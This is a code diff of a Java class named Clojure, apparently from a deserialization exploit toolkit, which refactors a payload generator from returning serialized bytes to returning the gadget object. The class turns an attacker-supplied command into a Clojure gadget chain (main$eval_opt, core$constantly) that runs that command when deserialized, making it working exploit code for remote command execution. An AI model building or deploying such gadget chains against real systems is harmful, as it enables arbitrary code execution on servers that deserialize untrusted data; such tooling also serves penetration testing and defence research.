@@ -28,7 +28,7 @@ import java.util.Map;
  */
 public class Clojure implements ObjectPayload<Map<?, ?>>{
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Map<?, ?> getObject(PayloadType type, String... param) throws Exception {
         String              command        = param[0];
         String              clojurePayload = ClojureUtil.makeClojurePayload(command);
         Map<String, Object> fnMap          = new HashMap<>();
@@ -41,20 +41,7 @@ public class Clojure implements ObjectPayload<Map<?, ?>>{
                 .invoke(new main$eval_opt(), (new core$constantly())
                         .invoke(clojurePayload)));
         model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));
-
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(targetMap);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Map<?, ?> getObject(String command) throws Exception {
-        return null;
+        return targetMap;
     }
 
 }
